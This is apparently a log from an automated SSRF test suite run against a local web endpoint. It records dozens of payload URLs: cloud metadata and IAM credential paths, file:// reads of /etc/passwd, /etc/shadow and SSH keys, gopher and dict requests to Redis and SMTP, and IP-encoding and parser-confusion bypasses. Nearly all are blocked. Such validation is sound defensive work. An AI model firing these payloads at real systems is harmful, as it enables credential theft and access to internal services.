+[2025-10-26 23:27:27] [INFO] ✅ Tested: Phar protocol blocking - Status: 403
+[2025-10-26 23:27:29] [INFO] ✅ Tested: Allowed API endpoint - Status: 200
+[2025-10-26 23:27:29] [INFO] ✅ Tested: Private class A blocking - Status: 403
+[2025-10-26 23:27:29] [INFO] ✅ Tested: Private class B blocking - Status: 403
+[2025-10-26 23:27:29] [INFO] ✅ Tested: Localhost hostname blocking - Status: 403
+[2025-10-26 23:27:29] [INFO] ✅ Tested: RFC 1918 blocking - Status: 403
+[2025-10-26 23:27:29] [INFO] ✅ Tested: All zeros blocking - Status: 403
+[2025-10-26 23:27:29] [INFO] ✅ Tested: Link-local blocking - Status: 403
+[2025-10-26 23:27:30] [INFO] ✅ Tested: Allowed external URL - Status: 200
+[2025-10-26 23:27:32] [INFO] ✅ Tested: Allowed HTTPS URL - Status: 200
+[2025-10-26 23:27:32] [INFO] Completed Security Control Validation: 0/16 vulnerabilities found
+[2025-10-26 23:27:33] [INFO] Starting internal network scanning...
+[2025-10-26 23:28:07] [INFO] Generating comprehensive report...
+[2025-10-26 23:28:07] [ERROR] Unexpected error: 'total_tests'
+[2025-10-26 23:28:27] [INFO] Starting comprehensive SSRF exploitation test against: http://localhost:5000/get
+[2025-10-26 23:28:27] [INFO] Starting internal service enumeration...
+[2025-10-26 23:28:27] [INFO] Running Internal Service Enumeration - 30 test cases...
+[2025-10-26 23:28:29] [INFO] ✅ Tested: Localhost access: http://127.0.0.1:80/ - Status: 403
+[2025-10-26 23:28:29] [INFO] ✅ Tested: Internal network gateway - Status: 403
+[2025-10-26 23:28:29] [INFO] ✅ Tested: Localhost access: http://localhost/ - Status: 403
+[2025-10-26 23:28:29] [INFO] ✅ Tested: Localhost access: http://0.0.0.0/ - Status: 403
+[2025-10-26 23:28:29] [INFO] ✅ Tested: Localhost access: http://[::1]/ - Status: 403
+[2025-10-26 23:28:29] [INFO] ✅ Tested: Localhost access: http://127.0.0.1/ - Status: 403
+[2025-10-26 23:28:29] [INFO] ✅ Tested: Router admin interface - Status: 403
+[2025-10-26 23:28:29] [INFO] ✅ Tested: Localhost access: http://localhost:8080/ - Status: 403
+[2025-10-26 23:28:29] [INFO] ✅ Tested: Localhost access: http://127.0.1/ - Status: 500
+[2025-10-26 23:28:29] [INFO] ✅ Tested: Localhost access: http://127.1/ - Status: 500
+[2025-10-26 23:28:31] [INFO] ✅ Tested: Corporate network - Status: 403
+[2025-10-26 23:28:31] [INFO] ✅ Tested: AWS Metadata service - Status: 403
+[2025-10-26 23:28:31] [INFO] ✅ Tested: GCP Metadata service - Status: 403
+[2025-10-26 23:28:31] [INFO] ✅ Tested: Common router IP - Status: 403
+[2025-10-26 23:28:31] [INFO] ✅ Tested: Local port 443 - Status: 403
+[2025-10-26 23:28:31] [INFO] ✅ Tested: Internal network - Status: 403
+[2025-10-26 23:28:31] [INFO] ✅ Tested: Localhost port 80 - Status: 403
+[2025-10-26 23:28:31] [INFO] ✅ Tested: Localhost port 443 - Status: 403
+[2025-10-26 23:28:31] [INFO] ✅ Tested: Local port 80 - Status: 403
+[2025-10-26 23:28:33] [INFO] ✅ Tested: Localhost port 8080 - Status: 403
+[2025-10-26 23:28:33] [INFO] ✅ Tested: Local port 8080 - Status: 403
+[2025-10-26 23:28:33] [INFO] ✅ Tested: Local port 8000 - Status: 403
+[2025-10-26 23:28:33] [INFO] ✅ Tested: Localhost port 8000 - Status: 403
+[2025-10-26 23:28:33] [INFO] ✅ Tested: Local port 3000 - Status: 403
+[2025-10-26 23:28:33] [INFO] ✅ Tested: Localhost port 3000 - Status: 403
+[2025-10-26 23:28:33] [INFO] ✅ Tested: Local port 5000 - Status: 403
+[2025-10-26 23:28:33] [INFO] ✅ Tested: Localhost port 5000 - Status: 403
+[2025-10-26 23:28:33] [INFO] ✅ Tested: Local port 9000 - Status: 403
+[2025-10-26 23:28:35] [INFO] ✅ Tested: Localhost port 9000 - Status: 403
+[2025-10-26 23:28:41] [ERROR] ❌ Error: Alibaba Cloud metadata - Timeout
+[2025-10-26 23:28:41] [INFO] Completed Internal Service Enumeration: 0/30 vulnerabilities found
+[2025-10-26 23:28:42] [INFO] Testing cloud metadata service access...
+[2025-10-26 23:28:42] [INFO] Running Cloud Metadata Access - 15 test cases...
+[2025-10-26 23:28:44] [INFO] ✅ Tested: AWS Metadata: http://169.254.169.254/latest/meta-data/ - Status: 403
+[2025-10-26 23:28:44] [INFO] ✅ Tested: AWS Metadata: http://169.254.169.254/latest/user-data/ - Status: 403
+[2025-10-26 23:28:44] [INFO] ✅ Tested: AWS Metadata: http://169.254.169.254/latest/dynamic/instance-identity/document - Status: 403
+[2025-10-26 23:28:44] [INFO] ✅ Tested: AWS Metadata: http://169.254.169.254/latest/meta-data/public-keys/ - Status: 403
+[2025-10-26 23:28:44] [INFO] ✅ Tested: AWS Metadata: http://169.254.169.254/latest/meta-data/ami-id - Status: 403
+[2025-10-26 23:28:44] [INFO] ✅ Tested: AWS Metadata: http://169.254.169.254/latest/meta-data/hostname - Status: 403
+[2025-10-26 23:28:44] [INFO] ✅ Tested: GCP Metadata: http://metadata.google.internal/computeMetadata/v1/instance/ - Status: 403
+[2025-10-26 23:28:44] [INFO] ✅ Tested: AWS Metadata: http://169.254.169.254/latest/meta-data/iam/security-credentials/ - Status: 403
+[2025-10-26 23:28:44] [INFO] ✅ Tested: GCP Metadata: http://metadata.google.internal/computeMetadata/v1/project/ - Status: 403
+[2025-10-26 23:28:44] [INFO] ✅ Tested: GCP Metadata: http://metadata.google.internal/computeMetadata/v1/ - Status: 403
+[2025-10-26 23:28:46] [INFO] ✅ Tested: Azure Metadata: http://169.254.169.254/metadata/attested/document - Status: 403
+[2025-10-26 23:28:46] [INFO] ✅ Tested: Azure Metadata: http://169.254.169.254/metadata/instance - Status: 403
+[2025-10-26 23:28:46] [INFO] ✅ Tested: DigitalOcean Metadata: http://169.254.169.254/metadata/v1/user-data - Status: 403
+[2025-10-26 23:28:46] [INFO] ✅ Tested: DigitalOcean Metadata: http://169.254.169.254/metadata/v1/id - Status: 403
+[2025-10-26 23:28:46] [INFO] ✅ Tested: DigitalOcean Metadata: http://169.254.169.254/metadata/v1/ - Status: 403
+[2025-10-26 23:28:46] [INFO] Completed Cloud Metadata Access: 0/15 vulnerabilities found
+[2025-10-26 23:28:47] [INFO] Testing dangerous protocol attacks...
+[2025-10-26 23:28:47] [INFO] Running Protocol-Based Attacks - 27 test cases...
+[2025-10-26 23:28:49] [INFO] ✅ Tested: File protocol: file:///etc/passwd - Status: 403
+[2025-10-26 23:28:49] [INFO] ✅ Tested: File protocol: file:///c:/boot.ini - Status: 403
+[2025-10-26 23:28:49] [INFO] ✅ Tested: File protocol: file:///proc/self/environ - Status: 403
+[2025-10-26 23:28:49] [INFO] ✅ Tested: File protocol: file:///c:/windows/system32/drivers/etc/hosts - Status: 403
+[2025-10-26 23:28:49] [INFO] ✅ Tested: File protocol: file:///etc/ssh/ssh_host_rsa_key - Status: 403
+[2025-10-26 23:28:49] [INFO] ✅ Tested: File protocol: file://../config.py - Status: 403
+[2025-10-26 23:28:49] [INFO] ✅ Tested: File protocol: file:///etc/hosts - Status: 403
+[2025-10-26 23:28:49] [INFO] ✅ Tested: File protocol: file://test_file.txt - Status: 403
+[2025-10-26 23:28:50] [INFO] ✅ Tested: File protocol: file:///etc/shadow - Status: 403
+[2025-10-26 23:28:50] [INFO] ✅ Tested: File protocol: file:///c:/windows/win.ini - Status: 403
+[2025-10-26 23:28:51] [INFO] ✅ Tested: File protocol: file://./app.py - Status: 403
+[2025-10-26 23:28:51] [INFO] ✅ Tested: Gopher protocol: gopher://127.0.0.1:6379/_INFO - Status: 403
+[2025-10-26 23:28:52] [INFO] ✅ Tested: Gopher protocol: gopher://127.0.0.1:25/_HELO%20localhost - Status: 403
+[2025-10-26 23:28:52] [INFO] ✅ Tested: Gopher protocol: gopher://localhost:6379/_KEYS%20* - Status: 403
+[2025-10-26 23:28:52] [INFO] ✅ Tested: Gopher protocol: gopher://localhost:25/_MAIL%20FROM%3A%20test%40test.com - Status: 403
+[2025-10-26 23:28:52] [INFO] ✅ Tested: Data URI: data:text/plain,SSRF%20Test%20Data - Status: 403
+[2025-10-26 23:28:52] [INFO] ✅ Tested: Gopher protocol: gopher://192.168.1.1:80/_GET%20/%20HTTP/1.0 - Status: 403
+[2025-10-26 23:28:52] [INFO] ✅ Tested: Data URI: data:text/html,<h1>SSRF%20Test</h1> - Status: 403
+[2025-10-26 23:28:52] [INFO] ✅ Tested: Data URI: data:application/x-php,<?php%20phpinfo();%20?> - Status: 403
+[2025-10-26 23:28:52] [INFO] ✅ Tested: Data URI: data:text/html,<script>alert("XSS")</script> - Status: 403
+[2025-10-26 23:28:53] [INFO] ✅ Tested: Data URI: data:text/css,body{background:red} - Status: 403
+[2025-10-26 23:28:54] [INFO] ✅ Tested: Dict protocol: dict://127.0.0.1:11211/stats - Status: 403
+[2025-10-26 23:28:54] [INFO] ✅ Tested: Dict protocol: dict://localhost:6379/info - Status: 403
+[2025-10-26 23:28:54] [INFO] ✅ Tested: Dict protocol: dict://192.168.1.1:80/ - Status: 403
+[2025-10-26 23:28:54] [INFO] ✅ Tested: Phar protocol: phar:///etc/passwd - Status: 403
+[2025-10-26 23:28:54] [INFO] ✅ Tested: Phar protocol: phar://./app.py - Status: 403
+[2025-10-26 23:28:54] [INFO] ✅ Tested: Phar protocol: phar://test_file.txt - Status: 403
+[2025-10-26 23:28:54] [INFO] Completed Protocol-Based Attacks: 0/27 vulnerabilities found
+[2025-10-26 23:28:55] [INFO] Testing SSRF bypass techniques...
+[2025-10-26 23:28:55] [INFO] Running Bypass Techniques - 26 test cases...
+[2025-10-26 23:28:57] [INFO] ✅ Tested: IP encoding: http://2130706433/ - Status: 403
+[2025-10-26 23:28:57] [INFO] ✅ Tested: IP encoding: http://3232235521/ - Status: 403
+[2025-10-26 23:28:57] [INFO] ✅ Tested: IP encoding: http://0xc0a80001/ - Status: 403
+[2025-10-26 23:28:57] [INFO] ✅ Tested: IP encoding: http://0x7f000001/ - Status: 403
+[2025-10-26 23:28:57] [INFO] ✅ Tested: IP encoding: http://0177.0.0.1/ - Status: 500
+[2025-10-26 23:28:57] [INFO] ✅ Tested: IP encoding: http://16843009/ - Status: 403
+[2025-10-26 23:28:57] [INFO] ✅ Tested: IP encoding: http://0177.0000.0000.0001/ - Status: 500
+[2025-10-26 23:28:57] [INFO] ✅ Tested: IP encoding: http://0x7f.0x0.0x0.0x1/ - Status: 403
+[2025-10-26 23:28:57] [INFO] ✅ Tested: IP encoding: http://0x7f.1/ - Status: 500
+[2025-10-26 23:28:57] [INFO] ✅ Tested: IP encoding: http://0x7f.0.0.1/ - Status: 500
+[2025-10-26 23:28:59] [INFO] ✅ Tested: IP encoding: http://127.0.1/ - Status: 500
+[2025-10-26 23:28:59] [INFO] ✅ Tested: IP encoding: http://127.1/ - Status: 500
+[2025-10-26 23:28:59] [INFO] ✅ Tested: DNS trick: http://subdomain.localhost/ - Status: 403
+[2025-10-26 23:28:59] [INFO] ✅ Tested: DNS trick: http://localhost.localdomain/ - Status: 403
+[2025-10-26 23:28:59] [INFO] ✅ Tested: DNS trick: http://localtest.me/ - Status: 403
+[2025-10-26 23:28:59] [INFO] ✅ Tested: DNS trick: http://127.0.0.1.nip.io - Status: 403
+[2025-10-26 23:28:59] [INFO] ✅ Tested: DNS trick: http://lvh.me/ - Status: 403
+[2025-10-26 23:28:59] [INFO] ✅ Tested: Parser confusion: http://127.0.0.1?@evil.com/ - Status: 403
+[2025-10-26 23:28:59] [INFO] ✅ Tested: Parser confusion: http://127.0.0.1#@evil.com/ - Status: 403
+[2025-10-26 23:28:59] [INFO] ✅ Tested: Parser confusion: http://evil.com@127.0.0.1/ - Status: 403
+[2025-10-26 23:29:01] [INFO] ✅ Tested: Parser confusion: http://[::]:80/ - Status: 403
+[2025-10-26 23:29:01] [INFO] ✅ Tested: Parser confusion: http://[::ffff:127.0.0.1]/ - Status: 403
+[2025-10-26 23:29:01] [INFO] ✅ Tested: Case variation: http://LOCALHOST/ - Status: 403
+[2025-10-26 23:29:01] [INFO] ✅ Tested: Case variation: http://LocalHost/ - Status: 403
+[2025-10-26 23:29:01] [INFO] ✅ Tested: Case variation: http://127.0.0.1:80/../ - Status: 403
+[2025-10-26 23:29:01] [INFO] ✅ Tested: Case variation: http://127.0.0.1:80/..;/ - Status: 403
+[2025-10-26 23:29:01] [INFO] Completed Bypass Techniques: 0/26 vulnerabilities found
+[2025-10-26 23:29:02] [INFO] Validating security controls...
+[2025-10-26 23:29:02] [INFO] Running Security Control Validation - 16 test cases...
+[2025-10-26 23:29:04] [INFO] ✅ Tested: Gopher protocol blocking - Status: 403
+[2025-10-26 23:29:04] [INFO] ✅ Tested: Localhost blocking - Status: 403
+[2025-10-26 23:29:04] [INFO] ✅ Tested: Data URI blocking - Status: 403
+[2025-10-26 23:29:04] [INFO] ✅ Tested: File protocol blocking - Status: 403
+[2025-10-26 23:29:04] [INFO] ✅ Tested: FTP protocol blocking - Status: 403
+[2025-10-26 23:29:04] [INFO] ✅ Tested: Phar protocol blocking - Status: 403
+[2025-10-26 23:29:04] [INFO] ✅ Tested: Dict protocol blocking - Status: 403
+[2025-10-26 23:29:06] [INFO] ✅ Tested: Allowed API endpoint - Status: 200
+[2025-10-26 23:29:06] [INFO] ✅ Tested: Localhost hostname blocking - Status: 403
+[2025-10-26 23:29:06] [INFO] ✅ Tested: RFC 1918 blocking - Status: 403
+[2025-10-26 23:29:06] [INFO] ✅ Tested: Private class A blocking - Status: 403
+[2025-10-26 23:29:06] [INFO] ✅ Tested: Link-local blocking - Status: 403
+[2025-10-26 23:29:06] [INFO] ✅ Tested: All zeros blocking - Status: 403
+[2025-10-26 23:29:06] [INFO] ✅ Tested: Private class B blocking - Status: 403
+[2025-10-26 23:29:06] [INFO] ✅ Tested: Allowed HTTPS URL - Status: 200
+[2025-10-26 23:29:06] [INFO] ✅ Tested: Allowed external URL - Status: 200
+[2025-10-26 23:29:06] [INFO] Completed Security Control Validation: 0/16 vulnerabilities found
+[2025-10-26 23:29:07] [INFO] Starting internal network scanning...
+[2025-10-26 23:29:41] [INFO] Generating comprehensive report...
+[2025-10-26 23:29:41] [ERROR] Unexpected error: 'total_tests'
